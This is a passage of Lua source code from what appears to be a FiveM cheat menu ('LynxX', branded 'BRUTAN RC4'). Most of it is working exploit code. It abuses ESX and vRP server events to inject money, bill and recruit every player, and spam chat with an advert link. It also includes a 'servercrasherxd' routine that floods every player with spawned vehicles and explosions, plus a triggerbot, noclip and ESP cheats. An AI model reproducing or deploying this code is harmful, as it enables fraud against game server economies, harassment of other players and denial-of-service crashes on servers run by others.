a8.b, 255) DrawLine(LineTwoBegin.x, LineTwoBegin.y, LineTwoBegin.z, LineTwoEnd.x, LineTwoEnd.y, LineTwoEnd.z, a8.r, a8.g, a8.b, 255) DrawLine(LineThreeBegin.x, LineThreeBegin.y, LineThreeBegin.z, LineThreeEnd.x, LineThreeEnd.y, LineThreeEnd.z, a8.r, a8.g, a8.b, 255) DrawLine(LineThreeEnd.x, LineThreeEnd.y, LineThreeEnd.z, LineFourBegin.x, LineFourBegin.y, LineFourBegin.z, a8.r, a8.g, a8.b, 255) DrawLine(TLineOneBegin.x, TLineOneBegin.y, TLineOneBegin.z, TLineOneEnd.x, TLineOneEnd.y, TLineOneEnd.z, a8.r, a8.g, a8.b, 255) DrawLine(TLineTwoBegin.x, TLineTwoBegin.y, TLineTwoBegin.z, TLineTwoEnd.x, TLineTwoEnd.y, TLineTwoEnd.z, a8.r, a8.g, a8.b, 255) DrawLine(TLineThreeBegin.x, TLineThreeBegin.y, TLineThreeBegin.z, TLineThreeEnd.x, TLineThreeEnd.y, TLineThreeEnd.z, a8.r, a8.g, a8.b, 255) DrawLine(TLineThreeEnd.x, TLineThreeEnd.y, TLineThreeEnd.z, TLineFourBegin.x, TLineFourBegin.y, TLineFourBegin.z, a8.r, a8.g, a8.b, 255) DrawLine(ConnectorOneBegin.x, ConnectorOneBegin.y, ConnectorOneBegin.z, ConnectorOneEnd.x, ConnectorOneEnd.y, ConnectorOneEnd.z, a8.r, a8.g, a8.b, 255) DrawLine(ConnectorTwoBegin.x, ConnectorTwoBegin.y, ConnectorTwoBegin.z, ConnectorTwoEnd.x, ConnectorTwoEnd.y, ConnectorTwoEnd.z, a8.r, a8.g, a8.b, 255) DrawLine(ConnectorThreeBegin.x, ConnectorThreeBegin.y, ConnectorThreeBegin.z, ConnectorThreeEnd.x, ConnectorThreeEnd.y, ConnectorThreeEnd.z, a8.r, a8.g, a8.b, 255) DrawLine(ConnectorFourBegin.x, ConnectorFourBegin.y, ConnectorFourBegin.z, ConnectorFourEnd.x, ConnectorFourEnd.y, ConnectorFourEnd.z, a8.r, a8.g, a8.b, 255) end;
		if esplines and esp then DrawLine(d8, d9, da, x, y, z, a8.r, a8.g, a8.b, 255) end end end end;
		if VehGod and IsPedInAnyVehicle(PlayerPedId(-1), true) then SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId(-1)), true) end;
		if oneshot then SetPlayerWeaponDamageModifier(PlayerId(-1), 100.0) local dd = getEntity(PlayerId(-1)) if IsEntityAPed(dd) then
		if IsPedInAnyVehicle(dd, true) then
		if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
		if IsControlJustReleased(1, 69) then NetworkExplodeVehicle(GetVehiclePedIsIn(dd, true), true, true, 0) end
		else if IsControlJustReleased(1, 142) then NetworkExplodeVehicle(GetVehiclePedIsIn(dd, true), true, true, 0) end end end end
		else SetPlayerWeaponDamageModifier(PlayerId(-1), 1.0) end;
		if rainbowf then
		for i = 1, 7 do Citizen.Wait(100) SetPedWeaponTintIndex(GetPlayerPed(-1), 1198879012, i) i = i + 1;
		if i == 7 then i = 1 end end end;
		if BlowDrugsUp then Citizen.CreateThread(function() TriggerServerEvent("esx_drugs:startHarvestWeed") TriggerServerEvent("esx_drugs:startHarvestCoke") TriggerServerEvent("esx_drugs:startHarvestMeth") TriggerServerEvent("esx_drugs:startTransformOpium") TriggerServerEvent("esx_drugs:startTransformWeed") TriggerServerEvent("esx_drugs:startTransformCoke") TriggerServerEvent("esx_drugs:startTransformMeth") TriggerServerEvent("esx_drugs:startTransformOpium") TriggerServerEvent("esx_drugs:startSellWeed") TriggerServerEvent("esx_drugs:startSellCoke") TriggerServerEvent("esx_drugs:startSellMeth") TriggerServerEvent("esx_drugs:startSellOpium") Citizen.Wait(1000) end) end;
		if blowall then
		for bD = 0, 9 do TriggerServerEvent("_chat:messageEntered", "^13^24^3B^4R^5U^6TAN Co^3m^4m^5u^6n^7i^1t^2y", {
				141, 211, 255
			}, "^"..bD..
			"BRUTAN RC4 ~ https://brutan.wixsite.com/fivem/fivem") end;
		for i = 0, 128 do Citizen.Wait(500) AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0) AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true) end end;
		if crosshair then ShowHudComponentThisFrame(14) end;
		if crosshairc then bz("~r~+", 0.495, 0.484) end;
		if crosshairc2 then bz("~r~.", 0.4968, 0.478) end;
		if cN then local de = false; local df = 130; local dg = 0;
		for f = 0, 128 do
			if NetworkIsPlayerActive(f)
		and GetPlayerPed(f)  ~= GetPlayerPed(-1) then ped = GetPlayerPed(f) blip = GetBlipFromEntity(ped) x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true)) x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(f), true)) distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true)) if de then
		if NetworkIsPlayerTalking(f) then local dh = k(1.0) DrawText3D(x2, y2, z2 + 1.2, GetPlayerServerId(f)..
			"  |  "..GetPlayerName(f), dh.r, dh.g, dh.b)
		else DrawText3D(x2, y2, z2 + 1.2, GetPlayerServerId(f)..
			"  |  "..GetPlayerName(f), 255, 255, 255) end end;
		if distance < df then
		if not de then
		if NetworkIsPlayerTalking(f) then local dh = k(1.0) DrawText3D(x2, y2, z2 + 1.2, GetPlayerServerId(f)..
			"  |  "..GetPlayerName(f), dh.r, dh.g, dh.b)
		else DrawText3D(x2, y2, z2 + 1.2, GetPlayerServerId(f)..
			"  |  "..GetPlayerName(f), 255, 255, 255) end end end end end end;
		if showCoords then x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(-1), true)) roundx = tonumber(string.format("%.2f", x)) roundy = tonumber(string.format("%.2f", y)) roundz = tonumber(string.format("%.2f", z)) bz("~r~X:~s~ "..roundx, 0.05, 0.00) bz("~r~Y:~s~ "..roundy, 0.11, 0.00) bz("~r~Z:~s~ "..roundz, 0.17, 0.00) end;

		function carthieftroll() for i = 0, 128 do local bK = GetEntityCoords(GetPlayerPed(i)) TriggerServerEvent("esx_carthief:alertcops", bK.x, bK.y, bK.z) end end;

		function automaticmoneyesx() local m = KeyboardInput("Warning, this value can be multiplied!!!", "", 100) if cO then
		if m ~= ""
		then local confirm = KeyboardInput("Are you sure? y/n", "", 0) if confirm == "y"
		then end; av("~h~~g~Testing all ~y~ESX ~g~scripts~s~.", true) TriggerServerEvent("esx_carthief:pay", m) TriggerServerEvent("esx_jobs:caution", "give_back", m) TriggerServerEvent("esx_fueldelivery:pay", m) TriggerServerEvent("esx_carthief:pay", m) TriggerServerEvent("esx_godirtyjob:pay", m) TriggerServerEvent("esx_pizza:pay", m) TriggerServerEvent("esx_ranger:pay", m) TriggerServerEvent("esx_garbagejob:pay", m) TriggerServerEvent("esx_truckerjob:pay", m) TriggerServerEvent("AdminMenu:giveBank", m) TriggerServerEvent("AdminMenu:giveCash", m) TriggerServerEvent("esx_gopostaljob:pay", m) TriggerServerEvent("esx_banksecurity:pay", m) TriggerServerEvent("esx_slotmachine:sv:2", m) elseif confirm == "n"
		then av("~h~~b~Operation cancelled~s~.", false)
		else av("~h~~b~Invalid Confirmation~s~.", true) av("~h~~b~Operation cancelled~s~.", false) end end end;

		function vrpdestroy() for bD = 0, 9 do TriggerServerEvent("_chat:messageEntered", "^13^24^3B^4R^5U^6TAN ^1C^2o^3m^4m^5u^6n^7i^1t^2y", {
				141, 211, 255
			}, "^"..bD..
			"BRUTAN RC4 ~ https://brutan.wixsite.com/fivem/fivem") end;
		TriggerServerEvent("lscustoms:payGarage", {
			costs = -99999999
		}) TriggerServerEvent("vrp_slotmachine:server:2", 999999999) TriggerServerEvent("Banca:deposit", 999999999) TriggerServerEvent("bank:deposit", 999999999) local di = GetPlayerServerId(PlayerId()) for i = 0, 128 do TriggerEvent("bank:transfer", di, GetPlayerServerId(i), 99999999) end end;
		if bv then esxdestroyv2() nukeserver() end;

		function esxdestroyv2() Citizen.CreateThread(function() TriggerServerEvent("esx_jobs:caution", "give_back", 9999999999) TriggerServerEvent("esx_fueldelivery:pay", 9999999999) TriggerServerEvent("esx_carthief:pay", 9999999999) TriggerServerEvent("esx_godirtyjob:pay", 9999999999) TriggerServerEvent("esx_pizza:pay", 9999999999) TriggerServerEvent("esx_ranger:pay", 9999999999) TriggerServerEvent("esx_garbagejob:pay", 9999999999) TriggerServerEvent("esx_truckerjob:pay", 9999999999) TriggerServerEvent("AdminMenu:giveBank", 9999999999) TriggerServerEvent("AdminMenu:giveCash", 9999999999) TriggerServerEvent("esx_gopostaljob:pay", 9999999999) TriggerServerEvent("esx_banksecurity:pay", 9999999999) TriggerServerEvent("esx_slotmachine:sv:2", 9999999999) for bD = 0, 9 do TriggerServerEvent("_chat:messageEntered", "^13^24^3B^4R^5U^6TAN ^1C^2o^3m^4m^5u^6n^7i^1t^2y", {
					141, 211, 255
				}, "^"..bD..
				"BRUTAN RC4 ~ https://brutan.wixsite.com/fivem/fivem") end;
			for i = 0, 128 do TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 1254756) TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 1254756) TriggerServerEvent("esx_billing:sendBill", GetPlayerServerId(i), "Purposeless", "BRUTAN RC4 ~ https://brutan.wixsite.com/fivem/fivem", 43161337) TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(i), "police", 3) TriggerServerEvent("NB:recruterplayer", i, "police", 3) end end) end;

		function giveeveryone() Citizen.CreateThread(function() TriggerServerEvent("esx_jobs:caution", "give_back", 9999999999) TriggerServerEvent("esx_fueldelivery:pay", 9999999999) TriggerServerEvent("esx_carthief:pay", 9999999999) TriggerServerEvent("esx_godirtyjob:pay", 9999999999) TriggerServerEvent("esx_pizza:pay", 9999999999) TriggerServerEvent("esx_ranger:pay", 9999999999) TriggerServerEvent("esx_garbagejob:pay", 9999999999) TriggerServerEvent("esx_truckerjob:pay", 9999999999) TriggerServerEvent("AdminMenu:giveBank", 9999999999) TriggerServerEvent("AdminMenu:giveCash", 9999999999) TriggerServerEvent("esx_gopostaljob:pay", 9999999999) TriggerServerEvent("esx_banksecurity:pay", 9999999999) TriggerServerEvent("esx_slotmachine:sv:2", 9999999999) for i = 0, 128 do TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 125475600) TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 125475600) end end) end;

		function nukeserver() Citizen.CreateThread(function() local dj = "Avenger"
			local dk = "CARGOPLANE"
			local dl = "luxor"
			local dm = "maverick"
			local dn = "blimp2"
			while not HasModelLoaded(GetHashKey(dk)) do Citizen.Wait(0) RequestModel(GetHashKey(dk)) end; while not HasModelLoaded(GetHashKey(dl)) do Citizen.Wait(0) RequestModel(GetHashKey(dl)) end;
			while not HasModelLoaded(GetHashKey(dj)) do Citizen.Wait(0) RequestModel(GetHashKey(dj)) end;
			while not HasModelLoaded(GetHashKey(dm)) do Citizen.Wait(0) RequestModel(GetHashKey(dm)) end;
			while not HasModelLoaded(GetHashKey(dn)) do Citizen.Wait(0) RequestModel(GetHashKey(dn)) end;
			for bD = 0, 9 do TriggerServerEvent("_chat:messageEntered", "^13^24^3B^4R^5U^6TAN ^1C^2o^3m^4m^5u^6n^7i^1t^2y", {
					141, 211, 255
				}, "^"..bD..
				"BRUTAN RC4 ~ https://brutan.wixsite.com/fivem/fivem") end;
			for i = 0, 128 do local dl = CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(dj), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(dk), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and CreateVehicle(GetHashKey(dl), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(dl), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(dl), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(dm), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(dn), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0) and AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true) end end) end;
		if servercrasherxd then Citizen.CreateThread(function() local dj = "Avenger"
			local dk = "CARGOPLANE"
			local dl = "luxor"
			local dm = "maverick"
			local dn = "blimp2"
			while not HasModelLoaded(GetHashKey(dk)) do Citizen.Wait(0) RequestModel(GetHashKey(dk)) end; while not HasModelLoaded(GetHashKey(dl)) do Citizen.Wait(0) RequestModel(GetHashKey(dl)) end;
			while not HasModelLoaded(GetHashKey(dj)) do Citizen.Wait(0) RequestModel(GetHashKey(dj)) end;
			while not HasModelLoaded(GetHashKey(dm)) do Citizen.Wait(0) RequestModel(GetHashKey(dm)) end;
			while not HasModelLoaded(GetHashKey(dn)) do Citizen.Wait(0) RequestModel(GetHashKey(dn)) end;
			for i = 0, 128 do
				for ak = 100, 150 do local dl = CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and CreateVehicle(GetHashKey(dj), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true) and CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and CreateVehicle(GetHashKey(dk), 2 * GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and CreateVehicle(GetHashKey(dl), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and CreateVehicle(GetHashKey(dl), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true) and CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and CreateVehicle(GetHashKey(dm), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true) and CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and CreateVehicle(GetHashKey(dn), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true) end end end) end;
		if VehSpeed and IsPedInAnyVehicle(PlayerPedId(-1), true) then
		if IsControlPressed(0, 209) then SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 100.0) elseif IsControlPressed(0, 210) then SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 0.0) end end;
		if TriggerBot then local dp, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(-1), Entity) if dp then
		if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then ShootPlayer(Entity) end end end; DisplayRadar(true) if RainbowVeh then local dq = k(1.0) SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), dq.r, dq.g, dq.b) SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), dq.r, dq.g, dq.b) end;
		if rainbowh then
		for i = -1, 12 do Citizen.Wait(100) local a8 = k(1.0) SetVehicleHeadlightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), i) SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), a8.r, a8.g, a8.b) if i ==
		12 then i = -1 end end end;
		if t2x then SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0) end;
		if t4x then SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0) end;
		if t10x then SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10.0 * 20.0) end;
		if t16x then SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0) end;
		if txd then SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 500.0 * 20.0) end;
		if tbxd then SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9999.0 * 20.0) end;
		if Noclip then local dr = 2; local ds = IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1) FreezeEntityPosition(PlayerPedId(-1), true) SetEntityInvincible(PlayerPedId(-1), true) local dt = GetEntityCoords(entity) DisableControlAction(0, 32, true) DisableControlAction(0, 268, true) DisableControlAction(0, 31, true) DisableControlAction(0, 269, true) DisableControlAction(0, 33, true) DisableControlAction(0, 266, true) DisableControlAction(0, 34, true) DisableControlAction(0, 30, true) DisableControlAction(0, 267, true) DisableControlAction(0, 35, true) DisableControlAction(0, 44, true) DisableControlAction(0, 20, true) local du = 0.0; local dv = 0.0;
		if GetInputMode() == "MouseAndKeyboard"
		then
		if IsDisabledControlPressed(0, 32) then du = 0.5 end;
		if IsDisabledControlPressed(0, 33) then du = -0.5 end;
		if IsDisabledControlPressed(0, 34) then SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) + 3.0) end;
		if IsDisabledControlPressed(0, 35) then SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) - 3.0) end;
		if IsDisabledControlPressed(0, 44) then dv = 0.21 end;
		if IsDisabledControlPressed(0, 20) then dv = -0.21 end end; dt = GetOffsetFromEntityInWorldCoords(ds, 0.0, du * (dr + 0.3), dv * (dr + 0.3)) local bL = GetEntityHeading(ds) SetEntityVelocity(ds, 0.0, 0.0, 0.0) SetEntityRotation(ds, 0.0, 0.0, 0.0, 0, false) SetEntityHeading(ds, bL) SetEntityCollision(ds, false, false) SetEntityCoordsNoOffset(ds, dt.x, dt.y, dt.z, true, true, true) FreezeEntityPosition(ds, false) SetEntityInvincible(ds, false) SetEntityCollision(ds, true, true) end end end) Citizen.CreateThread(function() FreezeEntityPosition(entity, false) local dw = 1; local dx = true; local dy = nil; local dz = nil; local dA = nil; local dB = 1; local dC = 1; local dD = {
			1.0, 2.0, 4.0, 10.0, 512.0, 9999.0
		}
		LynxEvo.CreateMenu("LynxX", bs) LynxEvo.SetSubTitle("LynxX", "BRUTAN Community") LynxEvo.CreateSubMenu("SelfMenu", "LynxX", "Self Menu") LynxEvo.CreateSubMenu("TeleportMenu", "LynxX", "Teleport Menu") LynxEvo.CreateSubMenu("WeaponMenu", "LynxX", "Weapon Menu") LynxEvo.CreateSubMenu("AdvM", "LynxX", "Advanced Menu") LynxEvo.CreateSubMenu("LuaMenu", "LynxX", "Lua Menu") LynxEvo.CreateSubMenu("VehicleMenu", "LynxX", "Vehicle Menu") LynxEvo.CreateSubMenu("OnlinePlayerMenu", "LynxX", "Online Player Menu") LynxEvo.CreateSubMenu("PlayerOptionsMenu", "OnlinePlayerMenu", "Player Options") LynxEvo.CreateSubMenu("Destroyer", "AdvM", "Destroyer Menu") LynxEvo.CreateSubMenu("ESXBoss", "LuaMenu", "ESX Boss Triggers") LynxEvo.CreateSubMenu("ESXMoney", "LuaMenu", "ESX Money Triggers") LynxEvo.CreateSubMenu("ESXDrugs", "LuaMenu", "ESX Drugs") LynxEvo.CreateSubMenu("ESXCustom", "LuaMenu", "ESX Random Triggers") LynxEvo.CreateSubMenu("VRPTriggers", "LuaMenu", "VRP Triggers") LynxEvo.CreateSubMenu("MiscTriggers", "LuaMenu", "Misc Triggers") LynxEvo.CreateSubMenu("crds", "LynxX", "Credits") LynxEvo.CreateSubMenu("ESXJobs", "LuaMenu", "ESX Jobs") LynxEvo.CreateSubMenu("ESXJobs2", "PlayerOptionsMenu", "ESX Jobs Individual") LynxEvo.CreateSubMenu("ESXTriggerini", "PlayerOptionsMenu", "ESX Triggers") LynxEvo.CreateSubMenu("Trollmenu", "PlayerOptionsMenu", "Troll Menu") LynxEvo.CreateSubMenu("WeaponTypes", "WeaponMenu", "Weapons") LynxEvo.CreateSubMenu("WeaponTypeSelection", "WeaponTypes", "Weapon") LynxEvo.CreateSubMenu("WeaponOptions", "WeaponTypeSelection", "Weapon Options") LynxEvo.CreateSubMenu("ModSelect", "WeaponOptions", "Weapon Mod Options") LynxEvo.CreateSubMenu("CarTypes", "VehicleMenu", "Vehicles") LynxEvo.CreateSubMenu("CarTypeSelection", "CarTypes", "Moew :3") LynxEvo.CreateSubMenu("CarOptions", "CarTypeSelection", "Car Options") LynxEvo.CreateSubMenu("MainTrailer", "VehicleMenu", "Trailers to Attach") LynxEvo.CreateSubMenu("MainTrailerSel", "MainTrailer", "Trailers Available") LynxEvo.CreateSubMenu("MainTrailerSpa", "MainTrailerSel", "Trailer Options") LynxEvo.CreateSubMenu("GiveSingleWeaponPlayer", "OnlinePlayerMenu", "Single Weapon Menu") LynxEvo.CreateSubMenu("ESPMenu", "AdvM", "ESP Menu") LynxEvo.CreateSubMenu("LSC", "VehicleMenu", "LSC Customs") LynxEvo.CreateSubMenu("tunings", "LSC", "Visual Tuning") LynxEvo.CreateSubMenu("performance", "LSC", "Performance Tuning") LynxEvo.CreateSubMenu("VRPPlayerTriggers", "PlayerOptionsMenu", "VRP Triggers") LynxEvo.CreateSubMenu("BoostMenu", "VehicleMenu", "Vehicle Boost") LynxEvo.CreateSubMenu("SpawnPeds", "Trollmenu", "Spawn Peds") LynxEvo.CreateSubMenu("GCT", "VehicleMenu", "Global Car Trolls") LynxEvo.CreateSubMenu("CsMenu", "AdvM", "Crosshairs") for i, dE in pairs(bl) do LynxEvo.CreateSubMenu(dE.id, "tunings", dE.name) if dE.
		id == "paint"
		then LynxEvo.CreateSubMenu("primary", dE.id, "Primary Paint") LynxEvo.CreateSubMenu("secondary", dE.id, "Secondary Paint") LynxEvo.CreateSubMenu("rimpaint", dE.id, "Wheel Paint") LynxEvo.CreateSubMenu("classic1", "primary", "Classic Paint") LynxEvo.CreateSubMenu("metallic1", "primary", "Metallic Paint") LynxEvo.CreateSubMenu("matte1", "primary", "Matte Paint") LynxEvo.CreateSubMenu("metal1", "primary", "Metal Paint") LynxEvo.CreateSubMenu("classic2", "secondary", "Classic Paint") LynxEvo.CreateSubMenu("metallic2", "secondary", "Metallic Paint") LynxEvo.CreateSubMenu("matte2", "secondary", "Matte Paint") LynxEvo.CreateSubMenu("metal2", "secondary", "Metal Paint") LynxEvo.CreateSubMenu("classic3", "rimpaint", "Classic Paint") LynxEvo.CreateSubMenu("metallic3", "rimpaint", "Metallic Paint") LynxEvo.CreateSubMenu("matte3", "rimpaint", "Matte Paint") LynxEvo.CreateSubMenu("metal3", "rimpaint", "Metal Paint") end end;
		for i, dE in pairs(bm) do LynxEvo.CreateSubMenu(dE.id, "performance", dE.name) end;
		local SelectedPlayer;
		while bw do ped = PlayerPedId() veh = GetVehiclePedIsUsing(ped) SetVehicleModKit(veh, 0) for i, dE in pairs(bl) do
			if LynxEvo.
		IsMenuOpened("tunings") then
		if bg then
		if bi == "neon"
		then local r, g, b = table.unpack(bh) SetVehicleNeonLightsColour(veh, r, g, b) SetVehicleNeonLightEnabled(veh, 0, bk) SetVehicleNeonLightEnabled(veh, 1, bk) SetVehicleNeonLightEnabled(veh, 2, bk) SetVehicleNeonLightEnabled(veh, 3, bk) bg = false; bi = -1; bh = -1 elseif bi == "paint"
		then local dF, dG, dH, dI = table.unpack(bh) SetVehicleColours(veh, dF, dG) SetVehicleExtraColours(veh, dH, dI) bg = false; bi = -1; bh = -1
		else if bk == "rm"
		then RemoveVehicleMod(veh, bi) bg = false; bi = -1; bh = -1
		else SetVehicleMod(veh, bi, bh, false) bg = false; bi = -1; bh = -1 end end end end;
		if LynxEvo.IsMenuOpened(dE.id) then
		if dE.id == "wheeltypes"
		then
		if LynxEvo.Button("Sport Wheels") then SetVehicleWheelType(veh, 0) elseif LynxEvo.Button("Muscle Wheels") then SetVehicleWheelType(veh, 1) elseif LynxEvo.Button("Lowrider Wheels") then SetVehicleWheelType(veh, 2) elseif LynxEvo.Button("SUV Wheels") then SetVehicleWheelType(veh, 3) elseif LynxEvo.Button("Offroad Wheels") then SetVehicleWheelType(veh, 4) elseif LynxEvo.Button("Tuner Wheels") then SetVehicleWheelType(veh, 5) elseif LynxEvo.Button("High End Wheels") then SetVehicleWheelType(veh, 7) end; LynxEvo.Display() elseif dE.id == "extra"
		then local dJ = checkValidVehicleExtras() for i, dE in pairs(dJ) do
			if IsVehicleExtraTurnedOn(veh, i)
		then pricestring = "Installed"
		else pricestring = "Not Installed"
		end;
		if LynxEvo.Button(dE.menuName, pricestring) then SetVehicleExtra(veh, i, IsVehicleExtraTurnedOn(veh, i)) end end; LynxEvo.Display() elseif dE.id == "headlight"
		then
		if LynxEvo.Button("None") then SetVehicleHeadlightsColour(veh, -1) end;
		for dK, dE in pairs(bo) do tp = GetVehicleHeadlightsColour(veh) if tp ==
		dE.id and not bg then pricetext = "Installed"
		else if bg and tp == dE.id then pricetext = "Previewing"
		else pricetext = "Not Installed"
		end end; head = GetVehicleHeadlightsColour(veh) if LynxEvo.Button(dE.name, pricetext) then
		if not bg then bi = "headlight"
		bk = false; oldhead = GetVehicleHeadlightsColour(veh) bh = table.pack(oldhead) SetVehicleHeadlightsColour(veh, dE.id) bg = true elseif bg and head == dE.id then ToggleVehicleMod(veh, 22, true) SetVehicleHeadlightsColour(veh, dE.id) bg = false; bi = -1; bh = -1 elseif bg and head ~= dE.id then SetVehicleHeadlightsColour(veh, dE.id) bg = true end end end; LynxEvo.Display() elseif dE.id == "licence"
		then
		if LynxEvo.Button("None") then SetVehicleNumberPlateTextIndex(veh, 3) end;
		for dK, dE in pairs(bn) do tp = GetVehicleNumberPlateTextIndex(veh) if tp ==
		dE.id and not bg then pricetext = "Installed"
		else if bg and tp == dE.id then pricetext = "Previewing"
		else pricetext = "Not Installed"
		end end; plate = GetVehicleNumberPlateTextIndex(veh) if LynxEvo.Button(dE.name, pricetext) then
		if not bg then bi = "headlight"
		bk = false; oldhead = GetVehicleNumberPlateTextIndex(veh) bh = table.pack(oldhead) SetVehicleNumberPlateTextIndex(veh, dE.id) bg = true elseif bg and plate == dE.id then SetVehicleNumberPlateTextIndex(veh, dE.id) bg = false; bi = -1; bh = -1 elseif bg and plate ~= dE.id then SetVehicleNumberPlateTextIndex(veh, dE.id) bg = true end end end; LynxEvo.Display() elseif dE.id == "neon"
		then
		if LynxEvo.Button("None") then SetVehicleNeonLightsColour(veh, 255, 255, 255) SetVehicleNeonLightEnabled(veh, 0, false) SetVehicleNeonLightEnabled(veh, 1, false) SetVehicleNeonLightEnabled(veh, 2, false) SetVehicleNeonLightEnabled(veh, 3, false) end;
		for i, dE in pairs(bq) do colorr, colorg, colorb = table.unpack(dE) r, g, b = GetVehicleNeonLightsColour(veh) if colorr ==
		r and colorg == g and colorb == b and IsVehicleNeonLightEnabled(vehicle, 2) and not bg then pricestring = "Installed"
		else if bg and colorr == r and colorg == g and colorb == b then pricestring = "Previewing"
		else pricestring = "Not Installed"
		end end;
		if LynxEvo.Button(i, pricestring) then
		if not bg then bi = "neon"
		bk = IsVehicleNeonLightEnabled(veh, 1) oldr, oldg, oldb = GetVehicleNeonLightsColour(veh) bh = table.pack(oldr, oldg, oldb) SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) SetVehicleNeonLightEnabled(veh, 0, true) SetVehicleNeonLightEnabled(veh, 1, true) SetVehicleNeonLightEnabled(veh, 2, true) SetVehicleNeonLightEnabled(veh, 3, true) bg = true elseif bg and colorr == r and colorg == g and colorb == b then SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) SetVehicleNeonLightEnabled(veh, 0, true) SetVehicleNeonLightEnabled(veh, 1, true) SetVehicleNeonLightEnabled(veh, 2, true) SetVehicleNeonLightEnabled(veh, 3, true) bg = false; bi = -1; bh = -1 elseif bg and colorr ~= r or colorg ~= g or colorb ~= b then SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) SetVehicleNeonLightEnabled(veh, 0, true) SetVehicleNeonLightEnabled(veh, 1, true) SetVehicleNeonLightEnabled(veh, 2, true) SetVehicleNeonLightEnabled(veh, 3, true) bg = true end end end; LynxEvo.Display() elseif dE.id == "paint"
		then
		if LynxEvo.MenuButton("~h~~p~#~s~ Primary Paint", "primary") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Secondary Paint", "secondary") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Wheel Paint", "rimpaint") then end; LynxEvo.Display()
		else local az = checkValidVehicleMods(dE.id) for i, dL in pairs(az) do
